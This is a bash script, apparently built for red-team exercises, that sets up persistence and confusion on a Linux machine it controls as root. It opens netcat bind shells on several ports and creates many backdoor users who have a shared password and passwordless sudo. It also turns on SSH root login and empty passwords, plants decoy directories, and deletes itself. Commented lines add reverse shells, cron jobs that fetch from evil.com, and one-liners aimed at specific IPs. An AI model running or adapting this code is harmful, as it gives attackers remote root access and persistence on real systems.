#!/bin/bash

if [ $EUID -ne 0 ]; then
  echo "You must run this script with root privileges."
  exit 2
fi

echo "Checking box for operating system type..."
OS_name=$(hostnamectl | grep "Operating System: " | awk '{ print $3 }')
if [[ "$OS_name" =~ (Rocky|Fedora|CentOS|Red|Oracle) ]]; then
  this_OS=1
else
  this_OS=0
fi
echo "--> Operating system recorded!"
sleep 0.3

echo "Installing required packages..."
if [ "$this_OS" -eq 1 ]; then
  echo "--> Installing netcat..."
  dnf install -y nc net-tools
else
  if ! command -v nc.traditional &>/dev/null; then
    echo "Netcat is not installed. Installing now..."
    apt-get install -y netcat-traditional
  fi
  if ! command -v netstat &>/dev/null; then
    echo "Netstat is not installed. Installing now..."
    apt-get install -y net-tools  
  fi
fi

echo "Setting up netcat listeners..." #(connect to target with this) nc -nv <ip> <port>
nc_ports=(69 420 4242 15000 1001 8008 80085 65000)
for nc_port in "${nc_ports[@]}"; do
  if ! sudo netstat -anp | grep -q ":$nc_port "; then
    nc.traditional -lvnp "$nc_port" -e /bin/bash &> /dev/null &
    echo "Started netcat listener on port $nc_port"
  else
    echo "Port $nc_port already in use"
  fi
done

#echo "Setting up reverse shell connections..." #connect to target with this {nc -lvnp <port>}
#bash_ports=(5005 42069 6969 1234 12345 666 1111 1337)
#for bash_port in "${bash_ports[@]}"; do
#  if ! sudo netstat -anp | grep -q ":$bash_port "; then
#    sudo bash -c "exec 5<>/dev/tcp/x.x.x.x/$bash_port; cat <&5 | while read line; do $line 2>&5 >&5; done" &
#    echo "Reverse shell attempting connection to x.x.x.x:$bash_port"
#  else
#    echo "Port $bash_port already in use"
#  fi
#done

echo "Creating random users and adding to sudo/root groups..."

# List of users to create
new_users=(jbadass blueteeth echo damien notredteam dack wolf troll sysinternals chron icon loot spray pluse scanni whoopsy netprod sysloog)
NEW_PASSWORD="bb123#123"

for user in "${new_users[@]}"; do
  if ! id "$user" &>/dev/null; then
    useradd -m -s /bin/bash "$user"
    echo "$user:$NEW_PASSWORD" | chpasswd

    # Add user to root and sudo groups
    usermod -aG sudo,root "$user"

    # Give full sudo privileges without password
    echo "$user ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/$user"
    chmod 0440 "/etc/sudoers.d/$user"

    echo "[+] Created user: $user with sudo/root privileges"
  else
    echo "[-] User $user already exists, skipping..."
  fi
done

echo "Weakening SSH security..."
sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#\?PermitEmptyPasswords .*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
systemctl restart sshd
echo "--> SSH now allows root login and empty passwords!"

#echo "Creating random cronjobs for persistence..."
#echo "* * * * * root /bin/bash -c 'nc -e /bin/bash 192.168.1.100 5555'" >> /etc/crontab
#echo "*/5 * * * * root /bin/bash -c 'wget -q -O - http://evil.com/payload.sh | bash'" >> /etc/crontab
#echo "--> Cronjobs added!"
# Add Goofy System Cronjobs
#echo "*/30 * * * * root /sbin/shutdown -r now" >> /etc/crontab
#echo "0 0 * * * root echo 'Kernel Panic' > /dev/console" >> /etc/crontab



# Create Obviously Fake Directories with Executables
fake_dirs=(
  /opt/NotAVirus /usr/local/bin/DefinitelyNotMalware /var/lib/System32 /etc/TopSecret
  "$HOME/dont-look" "$HOME/not-here" "$HOME/seriously-stop"
  /home/ubuntu/leave-me-alone /home/ubuntu/malware /home/ubuntu/not-malware /home/ubuntu/perfectly-normal
)

fake_binaries=(
  goofy.sh eyes.sh not-here.sh shell.rs reverse-shell
  c2-server beacon4 red-team dont-run rootkit cve-attack
)

for dir in "${fake_dirs[@]}"; do
  mkdir -p "$dir"

  # Create random fake executables
  for ((i=0; i<$((RANDOM % 3 + 1)); i++)); do
    binary_name="${fake_binaries[RANDOM % ${#fake_binaries[@]}]}"
    dd if=/dev/urandom of="$dir/$binary_name" bs=64K count=16 status=none
    chmod +x "$dir/$binary_name"
    echo "Created fake executable: $dir/$binary_name"
  done
done

#create stupid hidden folders
echo "Creating hidden folders..."
for i in {1..100}; do
  mkdir -p "/root/.malicious_file_$i"
done
echo "--> Hidden files created!"

echo "Red herring script execution completed!"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"  # Get the full path of the current script's directory
cd "$HOME"  # Navigate to home directory to safely delete the folder
echo "Deleting script and its directory: $SCRIPT_DIR"
rm -rf "$SCRIPT_DIR"






#runs on target (connect to target with this) nc -nv 172.18.219.197 443
#sudo nc -lvnp 443 -e /bin/bash


#runs on target 
#/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1


#connect to target with this {nc -lvnp 9001}
